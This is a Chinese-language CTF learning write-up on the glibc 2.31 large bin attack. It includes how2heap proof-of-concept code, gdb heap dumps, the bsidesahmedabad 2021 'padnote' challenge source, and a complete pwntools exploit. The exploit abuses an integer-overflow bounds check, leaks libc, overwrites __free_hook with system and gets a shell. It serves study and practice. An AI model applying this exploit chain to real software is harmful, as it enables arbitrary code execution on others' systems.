
title:   Large bin Attack for Glibc 2.31 学习
categories: [CTF]
tags: [pwn]

---
一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉~~~(◞‸◟ )tcl...）<!--more-->

## Large bin Attack目的

Large bin Attack的目的是 利用Large bin 向任意一地址任意一个地址写入一个大数(p2 chunk addr).

## how2heap 源码学习

经过信息收集，发现在how2heap中更新了Large bin Attack 源码。(ps:菜鸡才知道正版[how2heap](https://github.com/shellphish/how2heap)项目有团队在不断维护，中文翻译版how2heap已经没有维护了，啊这.....)

### 源码

```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck;
        bck = bck->bk;
        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    }


*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
  printf("Check 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("Check 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("This prevents the traditional large bin attack\n");
  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");

  printf("====================================================================\n\n");

  size_t target = 0;
  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("And another chunk to prevent consolidate\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
  printf("Once again, allocate a guard chunk to prevent consolidate\n");

  printf("\n");

  free(p1);
  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

  printf("\n");

  free(p2);
  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  printf("  the modified p1->bk_nextsize does not trigger any error\n");
  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
  printf("Target (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}
```

### 新保护

由上文源码所说，在2.30后libc 增加了两个检查：

```c
#check 1：
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");
#check 2:
if (bck->fd != fwd)
malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
  printf("This prevents the traditional large bin attack\n");
```

先说check 2：对当前bin的bk值对应bin的 fd是否为当前bin。

check 1 对largebin的bk_nextsize进行了跟bk一样的检查，即当前bin的bk_nextsize值对应bin的 fd_nextsize是否为当前bin。

### 新利用点

```c
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck;
        bck = bck->bk;
        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    }
```

这源码中，核心就是利用这段代码。这部分完整的源码在https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831

这个代码在unsorted bin加入largebin时，若unsorted bin 大小大于目前最大largebin时触发。在触发时，被未对`fd_nextsize`和`bk_nextsize`进行检查，就直接向`victim->bk_nextsize->fd_nextsize`写入victim的地址。

### 流程梳理

首先我们如下写创建4个chunk。

```c
  size_t target = 0;
  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("And another chunk to prevent consolidate\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
```

然后：

```c
 free(p1);
  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
```

让p1 加入了larger bin，此时:

```shell
largebins
0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0
```

然后释放p2:

```c
  free(p2);
 printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
p1[3] = (size_t)((&target)-4);//修改p1 bk_nextsize 为target+0x20  
```

此时p2为unsortedbin：

```
unsortedbin
all: 0x55f31dd5ea30 —▸ 0x7f0c129bbbe0 (main_arena+96) ◂— 0x55f31dd5ea30
smallbins
empty
largebins
0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0
```

此时P1的内存分布为：

```
gdb-peda$ x/36gx 0x55f31dd5e5e0
0x55f31dd5e5e0: 0x0000000000000000      0x0000000000000431
0x55f31dd5e5f0: 0x00007f0c129bbfd0      0x00007f0c129bbfd0
0x55f31dd5e600: 0x000055f31dd5e5e0      0x00007f0c129bee30 （target+0x20)
0x55f31dd5e610: 0x0000000000000000      0x0000000000000000
0x55f31dd5e620: 0x0000000000000000      0x0000000000000000
0x55f31dd5e630: 0x0000000000000000      0x0000000000000000
```

然后我们再让p2进入larger bin

```c
size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
```

这时，由于p1>p2,我们的攻击将进行

```c
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
//victim在例子中p2
//victim->bk_nextsize->fd_nextsize 为我们修改的p1->bk_nextsize的值
//fwd->fd->bk_nextsize为p1->bk_nextsize
```

,在target处写入p2地址：

```
0x7f0c129bee30:   0x0000000000000000      0x0000000000000000
0x7f0c129bee40:   0x0000000000000000      0x0000000000000000
0x7f0c129bee50:   0x000055f31dd5ea30      0x0000000000000000
0x7f0c129bee60:   0x0000000000000000      0x0000000000000000
0x7f0c129bee70:   0x0000000000000000      0x0000000000000000
```

## 例题_bsidesahmedabad_2021_padnote

题目环境：

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

题目源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define CHECK_FAIL(ERR) {                       \
    puts(ERR);                                  \
    return;                                     \
  }

#define MAX_NOTE 4

typedef struct {
  int size;
  char *content;
} Note;

Note noteList[MAX_NOTE];

void ReadLine(char *buf, int size) {
  char c;

  for (int i = 0; i != size - 1; i++) {
    if (read(0, &c, sizeof(c)) < 0)
      exit(1); // IO error
    if (c == '\n')
      break;
    else
      buf[i] = c;
  }
}

void CreateNote(Note *note) {
  int size;
  char *content;

  /* Check if note is empty */
  if (note->content)
    CHECK_FAIL("Note is in use");

  /* Input data length */
  printf("Size: ");
  if (scanf("%d%*c", &size) <= 0)
    exit(0); // IO error

  /* Security check */
  if (size <= 0)
    CHECK_FAIL("Size must be larger than 0");

  /* Initialize note */
  if (!(content = (char*)calloc(sizeof(char), size)))
    CHECK_FAIL("Could not allocate the memory");

  /* Input content */
  printf("Content: ");
  ReadLine(content, size);

  note->content = content;
  note->size = size;
}

void EditNote(Note *note) {
  int offset, count, epos;

  /* Check if note is empty */
  if (!note->content)
    CHECK_FAIL("Note is empty");

  /* Input offset */
  printf("Offset: ");
  if (scanf("%d%*c", &offset) <= 0)
    exit(0); // IO error

  /* Input count */
  printf("Count: ");
  if (scanf("%d%*c", &count) <= 0)
    exit(0); // IO error

  /* Security check */
  if (offset < 0)
    CHECK_FAIL("Invalid offset");
  if (count <= 0)
    CHECK_FAIL("Invalid count");
  if ((epos = offset + count) < 0)
    CHECK_FAIL("Integer overflow");
  if (epos > note->size)
    CHECK_FAIL("Out-of-bound access");
  
  /* Edit content */
  printf("Content: ");
  ReadLine(&note->content[offset], count);
}

void PrintNote(Note *note) {
  /* Check if note is empty */
  if (!note->content)
    CHECK_FAIL("Note is empty");

  /* Print note */
  printf("Content: ");
  if (write(1, note->content, note->size) <= 0)
    exit(0); // IO error
  putchar('\n');
}

void DeleteNote(Note *note) {
  /* Check if note is empty */
  if (!note->content)
    CHECK_FAIL("Note is empty");

  /* Delete note */
  free(note->content);
  note->size = 0;
  note->content = NULL;
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(180);

  puts("1. CreateNote");
  puts("2. EditNote");
  puts("3. PrintNote");
  puts("4. DeleteNote");
  while (1) {
    int choice, index;

    /* Input choice */
    printf("Choice: ");
    if (scanf("%d%*c", &choice) <= 0)
      exit(0);
    if (choice < 1 || choice > 4) {
      puts("Bye!");
      return 0;
    }

    /* Input index */
    printf("Index: ");
    if (scanf("%d%*c", &index) <= 0)
      exit(0);

    /* Security check */
    if (index < 0 || index >= MAX_NOTE) {
      puts("Invalid index");
      continue;
    }

    switch (choice) {
    case 1: CreateNote(&noteList[index]); break;
    case 2: EditNote(&noteList[index]); break;
    case 3: PrintNote(&noteList[index]); break;
    case 4: DeleteNote(&noteList[index]); break;
    }
  }
}

```

题目主要漏洞在它的edit功能的安全检查：

```c
  /* Security check */
  if (offset < 0)
    CHECK_FAIL("Invalid offset");
  if (count <= 0)
    CHECK_FAIL("Invalid count");
  if ((epos = offset + count) < 0)
    CHECK_FAIL("Integer overflow");
  if (epos > note->size)
    CHECK_FAIL("Out-of-bound access");
```

题目在`offset + count`进行检查时，忘了在int64 中`0x8000000==0`的情况。

导致我们可以任意写，然后通过 `PrintNote`泄露出基地址。

但是，由于calloc函数，导致我们不能用tache bin 来attack。

但是由于题目没有限制chunk大小，导致我们可以利用Large bin Attack 写入_`_free_hook+0x20`处再创造chunk覆盖`__free_hook`为system。

exp：

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/11/07 21:47:24
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./chall'
e=ELF(elf)
context.log_level = 'debug'
context.arch=e.arch
ip_port=['pwn.bsidesahmedabad.in',9003]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])


def add(num,size,text):
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(num))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.sendline(text)

def edit(num,offset,count,text):
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(num))
    p.recvuntil('Offset:')
    p.sendline(str(offset))
    p.recvuntil('Count:')
    p.sendline(str(count))
    p.recvuntil('Content:')
    p.sendline(text)

def show(num):
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(num))

   
def free(num):
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(num))



add(0,0x48,'x'*8)

add(1,0x278,'x'*8)

add(2,0x278,'x'*8)

add(3,0x548,'x'*8)



edit(0,2,2147483647-1,'8'*0x46+p64(0x501)+'8'*0x10)

free(1)
add(1,0x2d8,'x'*0x270+p64(0)+p64(0x281))
show(2)
addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96
log.info(hex(addr))
malloc_hook=addr-0x10
x=finder('__malloc_hook',malloc_hook,num=6)
free_hook=x.dump('__free_hook')
free(2)
free(3)
free(1)
free(0)

add(0,0x10,'0'*8)
add(1,0x428,'1'*8) #p1
add(2,0x10,'2'*8)#g1
add(3,0x418,'3'*8)#p2
# put a chunk to unsorted bin
free(1)
# put a chunk to large bin
add(1,0x438,'1'*4)
# put a chunk to unsorted bi
free(3)
#modify bk->next of chunk p1

edit(0, 0x38, (0x7fffffff-0x38+1), p64(free_hook-0x4b-2) )

add(3,0x440,'3'*8)

free(0)
free(2)
free(3)

for i in range(6):
    add(0,0x40,'0'*8)
    free(0)

add(0,0x40,'0'*8)
add(2,0x40,'2'*8)

free(2)
edit(0, 8, (0x7fffffff-8+1),0x40*'1'+p64(0x51)+p64(free_hook-0x30) )

add(2,0x40,'/bin/sh\x00')


add(3,0x40,'3'*0x20+p64(x.dump('system')))

free(2)
debug()


p.interactive()

```



## 参考文献

https://www.anquanke.com/post/id/244018

https://www.anquanke.com/post/id/242640#h2-2

